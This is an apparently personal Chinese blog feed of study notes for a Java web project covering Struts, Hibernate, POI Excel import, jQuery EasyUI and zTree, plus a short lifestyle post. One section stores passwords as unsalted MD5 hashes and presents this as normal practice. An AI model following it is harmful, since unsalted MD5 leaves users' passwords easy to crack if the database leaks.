&lt;h1 id=&quot;修改取派员信息&quot;&gt;&lt;a href=&quot;#修改取派员信息&quot; class=&quot;headerlink&quot; title=&quot;修改取派员信息&quot;&gt;&lt;/a&gt;修改取派员信息&lt;/h1&gt;&lt;p&gt;在datagrid中定义一个双击行事件onDblClickRow&lt;br&gt;function doDblClickRow(rowIndex, rowData){&lt;br&gt;  //打开修改取派员窗口&lt;br&gt;  $(‘#editStaffWindow’).window(“open”);&lt;br&gt;  //rowData将数据装到form表单&lt;br&gt;  $(‘#editstaffForm’).form(‘load’,rowData);&lt;br&gt;  //alert(rowData.name);&lt;br&gt;  $(‘#edit’).click(&lt;br&gt;    function(){&lt;br&gt;      var v=$(‘#editstaffForm’).form(“validate”);&lt;br&gt;      if(v){&lt;br&gt;        $(‘#editstaffForm’).submit();&lt;br&gt;      }&lt;br&gt;    }&lt;br&gt;  );&lt;br&gt;}&lt;br&gt;更新时需要注意先从数据中查询原始数据，然后在原始数据对象上修改。不能把模型对象直接交给hibernate更新。&lt;/p&gt;
&lt;h1 id=&quot;区域设置&quot;&gt;&lt;a href=&quot;#区域设置&quot; class=&quot;headerlink&quot; title=&quot;区域设置&quot;&gt;&lt;/a&gt;区域设置&lt;/h1&gt;&lt;p&gt;一键导入（使用jQuery提供的ocupload.js插件）&lt;br&gt;原理：在form表单中动态添加target属性，值等于动态生成的iframe的name，实现页面没有跳转的效果。&lt;br&gt;使用规则：&lt;br&gt;第一步：在jsp页面中引入插件的js文件&lt;br&gt;第二步：在页面中提供任意一个元素&lt;br&gt;input id=’btn1’ value=”上传” type=”button”&lt;br&gt;第三步：调用插件提供的upload方法，动态修改页面html代码&lt;br&gt;$(function(){&lt;br&gt;    $(“#btn1”).upload(&lt;br&gt;      {&lt;br&gt;        action:’xxx.action’&lt;br&gt;        name:’myfile’&lt;br&gt;      }&lt;br&gt;      );&lt;br&gt;  });&lt;/p&gt;
&lt;h2 id=&quot;解析excel文件（POI的使用）&quot;&gt;&lt;a href=&quot;#解析excel文件（POI的使用）&quot; class=&quot;headerlink&quot; title=&quot;  解析excel文件（POI的使用）&quot;&gt;&lt;/a&gt;  解析excel文件（POI的使用）&lt;/h2&gt;&lt;p&gt;  对于小数据量可以用hssf在action中直接解析&lt;br&gt;  第一步：HSSFWorkbook&lt;br&gt;  第二步：Sheet&lt;br&gt;  第三步：Row&lt;br&gt;  第四步：Cell&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;
  &lt;pre&gt;
    HSSFWorkbook workbook=new HSSFWorkbook(new FileInputStream(myfile));
       HSSFSheet sheet=workbook.getSheetAt(0);

       List&lt;Region&gt; list=new ArrayList&lt;Region&gt;();
       for(Row row:sheet){
         int rownum=row.getRowNum();
         if(rownum==0){
              continue;
         }
        String id=row.getCell(0).getStringCellValue();
        String  province=row.getCell(1).getStringCellValue();
        String  city=row.getCell(2).getStringCellValue();
        String  district=row.getCell(3).getStringCellValue();
        String  postcode=row.getCell(4).getStringCellValue();
        Region region=new Region(id, province, city, district, postcode, null, null, null);
        list.add(region);
       }
       regionService.insertBatch(list);
&lt;/pre&gt;





&lt;h2 id=&quot;使用Pinyin4J生成简码和城市编码&quot;&gt;&lt;a href=&quot;#使用Pinyin4J生成简码和城市编码&quot; class=&quot;headerlink&quot; title=&quot;使用Pinyin4J生成简码和城市编码&quot;&gt;&lt;/a&gt;使用Pinyin4J生成简码和城市编码&lt;/h2&gt;&lt;p&gt;导入一个pinyin4j工具类和jar包然后根据城市名称生成简码和城市编码。&lt;/p&gt;
&lt;h1 id=&quot;添加分区&quot;&gt;&lt;a href=&quot;#添加分区&quot; class=&quot;headerlink&quot; title=&quot;添加分区&quot;&gt;&lt;/a&gt;添加分区&lt;/h1&gt;&lt;p&gt;第一步：使用combobox展示区域数据到下拉框中&lt;br&gt;第二步：在RegionAction中提供findALL方法，查询所有的区域数据，返回json数据,&lt;br&gt;为了使返回的json中含有name字段，需要在Region类中提供getName方法&lt;/p&gt;
&lt;p&gt;组合条件查询：&lt;br&gt;页面使用datagrid的load的方法&lt;br&gt;
    
    </summary>
    
      <category term="Tech" scheme="http://burinicc.cn/categories/Tech/"/>
    
    
      <category term="项目" scheme="http://burinicc.cn/tags/%E9%A1%B9%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>Mess x</title>
    <link href="http://burinicc.cn/2016/12/02/messx/"/>
    <id>http://burinicc.cn/2016/12/02/messx/</id>
    <published>2016-12-02T01:28:55.000Z</published>
    <updated>2016-12-11T05:02:24.151Z</updated>
    
    <content type="html"><![CDATA[<p></p><h1><br>Need A “illeia break”,and Hv a good rest tonight</h1><p></p>
<iframe width="380" height="280" src="https://www.youtube.com/embed/qpaC4QuVKMk" frameborder="0"></iframe>

<img src="/images/title.png" width="200" height="10">
<p>//TODO</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;/p&gt;&lt;h1&gt;&lt;br&gt;Need A “illeia break”,and Hv a good rest tonight&lt;/h1&gt;&lt;p&gt;&lt;/p&gt;
&lt;iframe width=&quot;380&quot; height=&quot;280&quot; src=&quot;https://www.youtube.com/em
    
    </summary>
    
      <category term="Lifestyle" scheme="http://burinicc.cn/categories/Lifestyle/"/>
    
    
      <category term="电影" scheme="http://burinicc.cn/tags/%E7%94%B5%E5%BD%B1/"/>
    
  </entry>
  
  <entry>
    <title>二期改造项目1</title>
    <link href="http://burinicc.cn/2016/12/02/%E4%BA%8C%E6%9C%9F%E6%94%B9%E9%80%A0%E9%A1%B9%E7%9B%AE%E7%AC%94%E8%AE%B0/"/>
    <id>http://burinicc.cn/2016/12/02/二期改造项目笔记/</id>
    <published>2016-12-01T16:00:00.000Z</published>
    <updated>2016-12-08T12:24:03.846Z</updated>
    
    <content type="html"><![CDATA[<p>用pdesigner设计出t_user.pdm,导入数据库,向t_user中插入一条测试用户数据<br>insert into t_user(id,username,password) values(‘1’,’test’,md5(‘123’))<br>这个需要注意的是md5加密。在业务层进行判断时也要把页面传过来的密码进行md5加密和这个密码进行比较，这里我写了一个md5的工具类。代码如下：</p>
<pre>public static String md5(String plainText) {
        byte[] secretBytes = null;
        try {
            secretBytes = MessageDigest.getInstance("md5").digest(
                    plainText.getBytes());
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException("没有md5这个算法！");
        }
        String md5code = new BigInteger(1, secretBytes).toString(16);// 16进制数字
        // 如果生成数字未满32位，需要前面补0
        for (int i = 0; i < 32 - md5code.length(); i++) {
            md5code = "0" + md5code;
        }
        return md5code;
    }</pre>


<pre><code>自定义一个登录拦截器
-------------------
struts只能识别默认的拦截器栈
        &lt;interceptors&gt;
        &lt;!-- 注册拦截器 --&gt;
        &lt;interceptor name=&quot;bosLoginInterceptor&quot; class=&quot;com.itheima.bos.web.interceptor.BOSLoginInterceptor&quot;&gt;
            &lt;param name=&quot;excludeMethods&quot;&gt;login&lt;/param&gt;
        &lt;/interceptor&gt;
        &lt;!-- 拦截器栈 --&gt;
        &lt;interceptor-stack name=&quot;mystack&quot;&gt;
                &lt;interceptor-ref name=&quot;bosLoginInterceptor&quot;/&gt;
                &lt;interceptor-ref name=&quot;defaultStack&quot;/&gt;
        &lt;/interceptor-stack&gt;
    &lt;/interceptors&gt;
    &lt;default-interceptor-ref name=&quot;mystack&quot;/&gt;
</code></pre><p>页面使用多个样式用空格隔开，例如<br>class=”txt01 easyui-validatebox”</p>
<pre>
var v = $("#editPasswordForm").form("validate");//对应表单中的所有输入框进行校验
if(v){//表单校验通过
                //判断两次输入是否一致
                var v1 = $("#txtNewPass").val();
                var v2 = $("#txtRePass").val();
                if(v1 == v2){
                    //输入一致，发送ajax请求，修改当前用户的密码
                    var url = "${pageContext.request.contextPath}/userAction_editPassword.action";
                    $.post(url,{"password":v1},function(data){
                        if(data == '1'){
                            //修改密码成功
                            $.messager.alert("提示信息","密码修改成功！","info");
                        }else{
                            //修改失败
                            $.messager.alert("提示信息","密码修改失败！","warning");
                        }
                        //关闭修改密码的窗口
                        $("#editPwdWindow").window("close");
                    });
                }else{
                    //输入不一致，提示用户输入不一致
                    $.messager.alert("提示信息","两次输入密码不一致！","warning");
                }
            }
</pre>
在编写dao时遇到了命名查询语句，它就是在对象映射文件domain.hbm.xml中的一个query标签
<pre>
&ltquery name=""&gt
sql语句
&lt/query&gt
</pre>
hibernate模板并没有提供命名语句查询，
<pre>
Session session = this.getSession();// 从本地线程中获得session对象
        // 使用命名查询语句获得一个查询对象
        Query query = session.getNamedQuery(queryName);
        // 为HQL语句中的？赋值
        int i = 0;
        for (Object arg : objects) {
            query.setParameter(i++, arg);
        }
        query.executeUpdate();// 执行更新
</pre>
在action中直接使用提示信息不太合理，改进措施把这些信息放到国际化配置文件中（message.properties)
ActionSupport类中提供了一个读取配置文件的方法getText("配置文件中的key")在struts.xml中注册这个配置文件的位置，
<pre>&ltconstant name="struts.custom.i18n.resources" value="message"&gt</pre>

<h2 id="struts提供的错误提示标签"><a href="#struts提供的错误提示标签" class="headerlink" title="struts提供的错误提示标签"></a>struts提供的错误提示标签</h2><pre>&ltfont color="red"&gt
&lts:actionerror/&gt
&lt/font&gt</pre>

<h1 id="jQuery-EasyUI在页面使用的规则（具体配置查看API）"><a href="#jQuery-EasyUI在页面使用的规则（具体配置查看API）" class="headerlink" title="jQuery EasyUI在页面使用的规则（具体配置查看API）"></a>jQuery EasyUI在页面使用的规则（具体配置查看API）</h1><hr>
<p>准备工作，在jsp页面中引入easyUI相关的资源文件</p>
<p><link rel="stylesheet" type="text/css" href="${pageContext.request.contextPath }/js/easyui/themes/default/easyui.css"></p>
<p><link rel="stylesheet" type="text/css" href="${pageContext.request.contextPath }/js/easyui/themes/icon.css"></p>
<p><script type="text/javascript" src="${pageContext.request.contextPath }/js/jquery-1.8.3.js"></script></p>
<p><script type="text/javascript" src="${pageContext.request.contextPath }/js/easyui/jquery.easyui.min.js"></script></p>
<h2 id="layout页面布局"><a href="#layout页面布局" class="headerlink" title="layout页面布局"></a>layout页面布局</h2><p>这个布局容器,有五个区域:北、南、东、西和中心。 他中心地区面板是必需的（特别注意）,但是边缘地区面板是可选的。每一个边缘地区面板可以缩放的拖动其边境, 他们也可以通过点击其收缩触发.布局可以嵌套,从而用户可以建立复杂的布局,他想要的。</p>
<p>使用规则（重要）<br>在要使用的块状元素中添加class=”easyui-layout”,使用div指定区域使用easyui提供的data-options=”region:’north’”北部区域<br>data-options=”region:’south’”南部区域<br>data-options=”region:’west’”西部区域<br>data-options=”region:’east’”东部区域<br>这时页面显示的效果并不好，要在北部区域和南部区域div加上style=”height：100px”指定高度<br>在西部和东部div加上style=”width：100px”指定高度 在div上加上title属性显示标题，自带折叠效果</p>
<h2 id="accordion折叠面板"><a href="#accordion折叠面板" class="headerlink" title="accordion折叠面板"></a>accordion折叠面板</h2><p>使用规则（重要）<br>在区域div中加入折叠面板div添加属性class=”easyui-accordion”，添加属性data-options=”fit:true”，表示自动填充区域div，每一个子div就是一个面板，在div上添加title属性显示标题，通常放在西部区域里面。</p>
<h2 id="tabs选项卡面板"><a href="#tabs选项卡面板" class="headerlink" title="tabs选项卡面板"></a>tabs选项卡面板</h2><p>使用规则（重要）<br>在中部区域加入选项卡面板div添加属性class=”easyui-tabs”，添加属性data-options=”fit:true”，表示自动填充区域div，在子div中，添加性data-options=”closable:true,iconCls:’icon-add’”表示这个div是可关闭的,面板的图标是添加，面板的图标可以到引入的icon.css中找到。</p>
<h1 id="Ztree树形插件–jQuery插件"><a href="#Ztree树形插件–jQuery插件" class="headerlink" title="Ztree树形插件–jQuery插件"></a>Ztree树形插件–jQuery插件</h1><p>我已经在官网上下载ztree插件，里面包括api<br>在页面导入资源文件</p>
<p><script type="text/javascript" src="${pageContext.request.contextPath }/js/ztree/jquery.ztree.all-3.5.js"></script></p>
<p><link rel="stylesheet" href="${pageContext.request.contextPath }/js/ztree/zTreeStyle.css" type="text/css"><br>使用规则（重要）<br>第一种方式：使用标准json数据构成ztree（了解)</p>
<pre>
&ltul id="ztree1" class="ztree"&gt&lt/ul&gt
$(function(){
                            //当页面加载完成后动态创建菜单
                            var setting={};//设置标准的ztree属性
                            //构造json数据
                            var zNodes=[//每个json数据代表一个节点
                                                    {
                                                        name:'系统管理'
                                                    },
                                                    {
                                                        name:'用户管理',children:[{name:'用户添加'},{name:'用户修改'}]
                                                    },
                                                    {
                                                        name:'权限管理'
                                                    }
                                                    ];
                                    //创建ztree
                                $.fn.zTree.init(
                                    $("#ztree1"),
                                    setting,
                                    zNodes
                                );

                        });
</pre>

<p>第二种方式：使用简单json数组数据构成ztree(推荐)<br>在实际开发中我们的节点数据一般来自于系统的业务数据,可以发送ajax请求找action要数据，然后赋给treeNodes</p>
<pre>
&ltul id="ztree2" class="ztree"&gt&lt/ul&gt
$(function(){
                                //当页面加载完成后动态创建菜单
                                var setting = {
                                        data: {
                                            simpleData: {
                                                enable: true,//启用简单数组数据
                                                idKey: "id",
                                                pIdKey: "pId",
                                                rootPId: 0
                                            }
                                        }
                                    };
                                    var treeNodes = [
                                        {"id":1, "pId":0, "name":"test1"},
                                        {"id":11, "pId":1, "name":"test11"},
                                        {"id":12, "pId":1, "name":"test12"},
                                        {"id":111, "pId":11, "name":"test111"}
                                    ];
                                    //创建ztree
                                    $.fn.zTree.init(
                                        $("#ztree2"),
                                        setting,
                                        treeNodes
                                    );
                            });

</pre>




<h2 id="给ztree绑定点击事件"><a href="#给ztree绑定点击事件" class="headerlink" title="给ztree绑定点击事件"></a>给ztree绑定点击事件</h2><pre>
<code>
function zTreeOnClick(event, treeId, treeNode) {
    var page=treeNode.page;
                    if(page!=undefined){//需要打开选项卡
                                     //判断当前选项卡是否已经打开

                                    var isExists= $("#tt").tabs("exists",treeNode.name);

                                 if(isExists){
                                     $("#tt").tabs("select",treeNode.name);
                                 }else{
                                     $("#tt").tabs("add",
                                                {
                                                 title: treeNode.name,
                                                content: '&ltiframe src="'+page+'" width="100%" frameborder="0" height="100%"&gt&lt/iframe&gt',
                                                closable: true,
                                             iconCls: 'icon-search'
                                                }  
                                            );
                                    }
                                 }
};
var setting = {
    callback: {
        onClick: zTreeOnClick
    }
};
</code>
</pre>


<h1 id="jQuery-EasyUI消息提示控件"><a href="#jQuery-EasyUI消息提示控件" class="headerlink" title="jQuery EasyUI消息提示控件"></a>jQuery EasyUI消息提示控件</h1><p>默认的提示框上面的按钮显示为ok，要想显示为中文，需要引入easyui下面locale下面的<br>easyui-lang-zh_CN.js</p>
<h2 id="alert方法-消息提示框"><a href="#alert方法-消息提示框" class="headerlink" title="alert方法,消息提示框"></a>alert方法,消息提示框</h2><p>$.messager.alert(“标题”,”内容信息”,”question/error/info/warning”);</p>
<h2 id="show方法-页面右下角出来提示信息"><a href="#show方法-页面右下角出来提示信息" class="headerlink" title="show方法,页面右下角出来提示信息"></a>show方法,页面右下角出来提示信息</h2><pre><code>window.setTimeout(function(){
            $.messager.show({
                title:&apos;欢迎信息&apos;,
                msg:&apos;欢迎张三登录系统&apos;,
                timeout:3000,
                showType:&apos;slide&apos;
            });
        }, 3000);
</code></pre><h2 id="confirm方法-确认框-如果点击确定，r的值为true"><a href="#confirm方法-确认框-如果点击确定，r的值为true" class="headerlink" title="confirm方法,确认框,如果点击确定，r的值为true"></a>confirm方法,确认框,如果点击确定，r的值为true</h2><pre><code>$.messager.confirm(&quot;提示信息&quot;,&quot;你确定删除当前数据吗？&quot;,function(r){
                        alert(r);
                    });
</code></pre><h2 id="prompt方法，跟confirm的作用差不多"><a href="#prompt方法，跟confirm的作用差不多" class="headerlink" title="prompt方法，跟confirm的作用差不多"></a>prompt方法，跟confirm的作用差不多</h2><pre><code>$.messager.prompt(&quot;提示信息&quot;,&quot;你确定删除当前数据吗？&quot;,function(r){
                                    alert(r);
                                });
</code></pre><h2 id="progress方法，进度条"><a href="#progress方法，进度条" class="headerlink" title="progress方法，进度条"></a>progress方法，进度条</h2><p>//打开进度条<br>$.messager.progress();<br>//关闭进度条<br>$.messager.progress(‘close’);<br><a id="more"></a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用pdesigner设计出t_user.pdm,导入数据库,向t_user中插入一条测试用户数据&lt;br&gt;insert into t_user(id,username,password) values(‘1’,’test’,md5(‘123’))&lt;br&gt;这个需要注意的是md5加密。在业务层进行判断时也要把页面传过来的密码进行md5加密和这个密码进行比较，这里我写了一个md5的工具类。代码如下：&lt;/p&gt;
&lt;pre&gt;public static String md5(String plainText) {
        byte[] secretBytes = null;
        try {
            secretBytes = MessageDigest.getInstance(&quot;md5&quot;).digest(
                    plainText.getBytes());
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(&quot;没有md5这个算法！&quot;);
        }
        String md5code = new BigInteger(1, secretBytes).toString(16);// 16进制数字
        // 如果生成数字未满32位，需要前面补0
        for (int i = 0; i &lt; 32 - md5code.length(); i++) {
            md5code = &quot;0&quot; + md5code;
        }
        return md5code;
    }&lt;/pre&gt;


&lt;pre&gt;&lt;code&gt;自定义一个登录拦截器
-------------------
struts只能识别默认的拦截器栈
        &amp;lt;interceptors&amp;gt;
        &amp;lt;!-- 注册拦截器 --&amp;gt;
        &amp;lt;interceptor name=&amp;quot;bosLoginInterceptor&amp;quot; class=&amp;quot;com.itheima.bos.web.interceptor.BOSLoginInterceptor&amp;quot;&amp;gt;
            &amp;lt;param name=&amp;quot;excludeMethods&amp;quot;&amp;gt;login&amp;lt;/param&amp;gt;
        &amp;lt;/interceptor&amp;gt;
        &amp;lt;!-- 拦截器栈 --&amp;gt;
        &amp;lt;interceptor-stack name=&amp;quot;mystack&amp;quot;&amp;gt;
                &amp;lt;interceptor-ref name=&amp;quot;bosLoginInterceptor&amp;quot;/&amp;gt;
                &amp;lt;interceptor-ref name=&amp;quot;defaultStack&amp;quot;/&amp;gt;
        &amp;lt;/interceptor-stack&amp;gt;
    &amp;lt;/interceptors&amp;gt;
    &amp;lt;default-interceptor-ref name=&amp;quot;mystack&amp;quot;/&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;页面使用多个样式用空格隔开，例如&lt;br&gt;class=”txt01 easyui-validatebox”&lt;/p&gt;
&lt;pre&gt;
var v = $(&quot;#editPasswordForm&quot;).form(&quot;validate&quot;);//对应表单中的所有输入框进行校验
if(v){//表单校验通过
                //判断两次输入是否一致
                var v1 = $(&quot;#txtNewPass&quot;).val();
                var v2 = $(&quot;#txtRePass&quot;).val();
                if(v1 == v2){
                    //输入一致，发送ajax请求，修改当前用户的密码
                    var url = &quot;${pageContext.request.contextPath}/userAction_editPassword.action&quot;;
                    $.post(url,{&quot;password&quot;:v1},function(data){
                        if(data == &#39;1&#39;){
                            //修改密码成功
                            $.messager.alert(&quot;提示信息&quot;,&quot;密码修改成功！&quot;,&quot;info&quot;);
                        }else{
                            //修改失败
                            $.messager.alert(&quot;提示信息&quot;,&quot;密码修改失败！&quot;,&quot;warning&quot;);
                        }
                        //关闭修改密码的窗口
                        $(&quot;#editPwdWindow&quot;).window(&quot;close&quot;);
                    });
                }else{
                    //输入不一致，提示用户输入不一致
                    $.messager.alert(&quot;提示信息&quot;,&quot;两次输入密码不一致！&quot;,&quot;warning&quot;);
                }
            }
&lt;/pre&gt;
在编写dao时遇到了命名查询语句，它就是在对象映射文件domain.hbm.xml中的一个query标签
&lt;pre&gt;
&amp;ltquery name=&quot;&quot;&amp;gt
sql语句
&amp;lt/query&amp;gt
&lt;/pre&gt;
hibernate模板并没有提供命名语句查询，
&lt;pre&gt;
Session session = this.getSession();// 从本地线程中获得session对象
        // 使用命名查询语句获得一个查询对象
        Query query = session.getNamedQuery(queryName);
        // 为HQL语句中的？赋值
        int i = 0;
        for (Object arg : objects) {
            query.setParameter(i++, arg);
        }
        query.executeUpdate();// 执行更新
&lt;/pre&gt;
在action中直接使用提示信息不太合理，改进措施把这些信息放到国际化配置文件中（message.properties)
ActionSupport类中提供了一个读取配置文件的方法getText(&quot;配置文件中的key&quot;)在struts.xml中注册这个配置文件的位置，
&lt;pre&gt;&amp;ltconstant name=&quot;struts.custom.i18n.resources&quot; value=&quot;message&quot;&amp;gt&lt;/pre&gt;

&lt;h2 id=&quot;struts提供的错误提示标签&quot;&gt;&lt;a href=&quot;#struts提供的错误提示标签&quot; class=&quot;headerlink&quot; title=&quot;struts提供的错误提示标签&quot;&gt;&lt;/a&gt;struts提供的错误提示标签&lt;/h2&gt;&lt;pre&gt;&amp;ltfont color=&quot;red&quot;&amp;gt
&amp;lts:actionerror/&amp;gt
&amp;lt/font&amp;gt&lt;/pre&gt;

&lt;h1 id=&quot;jQuery-EasyUI在页面使用的规则（具体配置查看API）&quot;&gt;&lt;a href=&quot;#jQuery-EasyUI在页面使用的规则（具体配置查看API）&quot; class=&quot;headerlink&quot; title=&quot;jQuery EasyUI在页面使用的规则（具体配置查看API）&quot;&gt;&lt;/a&gt;jQuery EasyUI在页面使用的规则（具体配置查看API）&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;准备工作，在jsp页面中引入easyUI相关的资源文件&lt;/p&gt;
&lt;p&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;${pageContext.request.contextPath }/js/easyui/themes/default/easyui.css&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;${pageContext.request.contextPath }/js/easyui/themes/icon.css&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;${pageContext.request.contextPath }/js/jquery-1.8.3.js&quot;&gt;&lt;/script &gt;&lt;/p&gt;
&lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;${pageContext.request.contextPath }/js/easyui/jquery.easyui.min.js&quot;&gt;&lt;/script &gt;&lt;/p&gt;
&lt;h2 id=&quot;layout页面布局&quot;&gt;&lt;a href=&quot;#layout页面布局&quot; class=&quot;headerlink&quot; title=&quot;layout页面布局&quot;&gt;&lt;/a&gt;layout页面布局&lt;/h2&gt;&lt;p&gt;这个布局容器,有五个区域:北、南、东、西和中心。 他中心地区面板是必需的（特别注意）,但是边缘地区面板是可选的。每一个边缘地区面板可以缩放的拖动其边境, 他们也可以通过点击其收缩触发.布局可以嵌套,从而用户可以建立复杂的布局,他想要的。&lt;/p&gt;
&lt;p&gt;使用规则（重要）&lt;br&gt;在要使用的块状元素中添加class=”easyui-layout”,使用div指定区域使用easyui提供的data-options=”region:’north’”北部区域&lt;br&gt;data-options=”region:’south’”南部区域&lt;br&gt;data-options=”region:’west’”西部区域&lt;br&gt;data-options=”region:’east’”东部区域&lt;br&gt;这时页面显示的效果并不好，要在北部区域和南部区域div加上style=”height：100px”指定高度&lt;br&gt;在西部和东部div加上style=”width：100px”指定高度 在div上加上title属性显示标题，自带折叠效果&lt;/p&gt;
&lt;h2 id=&quot;accordion折叠面板&quot;&gt;&lt;a href=&quot;#accordion折叠面板&quot; class=&quot;headerlink&quot; title=&quot;accordion折叠面板&quot;&gt;&lt;/a&gt;accordion折叠面板&lt;/h2&gt;&lt;p&gt;使用规则（重要）&lt;br&gt;在区域div中加入折叠面板div添加属性class=”easyui-accordion”，添加属性data-options=”fit:true”，表示自动填充区域div，每一个子div就是一个面板，在div上添加title属性显示标题，通常放在西部区域里面。&lt;/p&gt;
&lt;h2 id=&quot;tabs选项卡面板&quot;&gt;&lt;a href=&quot;#tabs选项卡面板&quot; class=&quot;headerlink&quot; title=&quot;tabs选项卡面板&quot;&gt;&lt;/a&gt;tabs选项卡面板&lt;/h2&gt;&lt;p&gt;使用规则（重要）&lt;br&gt;在中部区域加入选项卡面板div添加属性class=”easyui-tabs”，添加属性data-options=”fit:true”，表示自动填充区域div，在子div中，添加性data-options=”closable:true,iconCls:’icon-add’”表示这个div是可关闭的,面板的图标是添加，面板的图标可以到引入的icon.css中找到。&lt;/p&gt;
&lt;h1 id=&quot;Ztree树形插件–jQuery插件&quot;&gt;&lt;a href=&quot;#Ztree树形插件–jQuery插件&quot; class=&quot;headerlink&quot; title=&quot;Ztree树形插件–jQuery插件&quot;&gt;&lt;/a&gt;Ztree树形插件–jQuery插件&lt;/h1&gt;&lt;p&gt;我已经在官网上下载ztree插件，里面包括api&lt;br&gt;在页面导入资源文件&lt;/p&gt;
&lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;${pageContext.request.contextPath }/js/ztree/jquery.ztree.all-3.5.js&quot;&gt;&lt;/script&gt;&lt;/p&gt;
&lt;p&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;${pageContext.request.contextPath }/js/ztree/zTreeStyle.css&quot; type=&quot;text/css&quot;&gt;&lt;br&gt;使用规则（重要）&lt;br&gt;第一种方式：使用标准json数据构成ztree（了解)&lt;/p&gt;
&lt;pre&gt;
&amp;ltul id=&quot;ztree1&quot; class=&quot;ztree&quot;&amp;gt&amp;lt/ul&amp;gt
$(function(){
                            //当页面加载完成后动态创建菜单
                            var setting={};//设置标准的ztree属性
                            //构造json数据
                            var zNodes=[//每个json数据代表一个节点
                                                    {
                                                        name:&#39;系统管理&#39;
                                                    },
                                                    {
                                                        name:&#39;用户管理&#39;,children:[{name:&#39;用户添加&#39;},{name:&#39;用户修改&#39;}]
                                                    },
                                                    {
                                                        name:&#39;权限管理&#39;
                                                    }
                                                    ];
                                    //创建ztree
                                $.fn.zTree.init(
                                    $(&quot;#ztree1&quot;),
                                    setting,
                                    zNodes
                                );

                        });
&lt;/pre&gt;

&lt;p&gt;第二种方式：使用简单json数组数据构成ztree(推荐)&lt;br&gt;在实际开发中我们的节点数据一般来自于系统的业务数据,可以发送ajax请求找action要数据，然后赋给treeNodes&lt;/p&gt;
&lt;pre&gt;
&amp;ltul id=&quot;ztree2&quot; class=&quot;ztree&quot;&amp;gt&amp;lt/ul&amp;gt
$(function(){
                                //当页面加载完成后动态创建菜单
                                var setting = {
                                        data: {
                                            simpleData: {
                                                enable: true,//启用简单数组数据
                                                idKey: &quot;id&quot;,
                                                pIdKey: &quot;pId&quot;,
                                                rootPId: 0
                                            }
                                        }
                                    };
                                    var treeNodes = [
                                        {&quot;id&quot;:1, &quot;pId&quot;:0, &quot;name&quot;:&quot;test1&quot;},
                                        {&quot;id&quot;:11, &quot;pId&quot;:1, &quot;name&quot;:&quot;test11&quot;},
                                        {&quot;id&quot;:12, &quot;pId&quot;:1, &quot;name&quot;:&quot;test12&quot;},
                                        {&quot;id&quot;:111, &quot;pId&quot;:11, &quot;name&quot;:&quot;test111&quot;}
                                    ];
                                    //创建ztree
                                    $.fn.zTree.init(
                                        $(&quot;#ztree2&quot;),
                                        setting,
                                        treeNodes
                                    );
                            });

&lt;/pre&gt;




&lt;h2 id=&quot;给ztree绑定点击事件&quot;&gt;&lt;a href=&quot;#给ztree绑定点击事件&quot; class=&quot;headerlink&quot; title=&quot;给ztree绑定点击事件&quot;&gt;&lt;/a&gt;给ztree绑定点击事件&lt;/h2&gt;&lt;pre&gt;
&lt;code&gt;
function zTreeOnClick(event, treeId, treeNode) {
    var page=treeNode.page;
                    if(page!=undefined){//需要打开选项卡
                                     //判断当前选项卡是否已经打开

                                    var isExists= $(&quot;#tt&quot;).tabs(&quot;exists&quot;,treeNode.name);

                                 if(isExists){
                                     $(&quot;#tt&quot;).tabs(&quot;select&quot;,treeNode.name);
                                 }else{
                                     $(&quot;#tt&quot;).tabs(&quot;add&quot;,
                                                {
                                                 title: treeNode.name,
                                                content: &#39;&amp;ltiframe src=&quot;&#39;+page+&#39;&quot; width=&quot;100%&quot; frameborder=&quot;0&quot; height=&quot;100%&quot;&amp;gt&amp;lt/iframe&amp;gt&#39;,
                                                closable: true,
                                             iconCls: &#39;icon-search&#39;
                                                }  
                                            );
                                    }
                                 }
};
var setting = {
    callback: {
        onClick: zTreeOnClick
    }
};
&lt;/code&gt;
&lt;/pre&gt;


&lt;h1 id=&quot;jQuery-EasyUI消息提示控件&quot;&gt;&lt;a href=&quot;#jQuery-EasyUI消息提示控件&quot; class=&quot;headerlink&quot; title=&quot;jQuery EasyUI消息提示控件&quot;&gt;&lt;/a&gt;jQuery EasyUI消息提示控件&lt;/h1&gt;&lt;p&gt;默认的提示框上面的按钮显示为ok，要想显示为中文，需要引入easyui下面locale下面的&lt;br&gt;easyui-lang-zh_CN.js&lt;/p&gt;
&lt;h2 id=&quot;alert方法-消息提示框&quot;&gt;&lt;a href=&quot;#alert方法-消息提示框&quot; class=&quot;headerlink&quot; title=&quot;alert方法,消息提示框&quot;&gt;&lt;/a&gt;alert方法,消息提示框&lt;/h2&gt;&lt;p&gt;$.messager.alert(“标题”,”内容信息”,”question/error/info/warning”);&lt;/p&gt;
&lt;h2 id=&quot;show方法-页面右下角出来提示信息&quot;&gt;&lt;a href=&quot;#show方法-页面右下角出来提示信息&quot; class=&quot;headerlink&quot; title=&quot;show方法,页面右下角出来提示信息&quot;&gt;&lt;/a&gt;show方法,页面右下角出来提示信息&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;window.setTimeout(function(){
            $.messager.show({
                title:&amp;apos;欢迎信息&amp;apos;,
                msg:&amp;apos;欢迎张三登录系统&amp;apos;,
                timeout:3000,
                showType:&amp;apos;slide&amp;apos;
            });
        }, 3000);
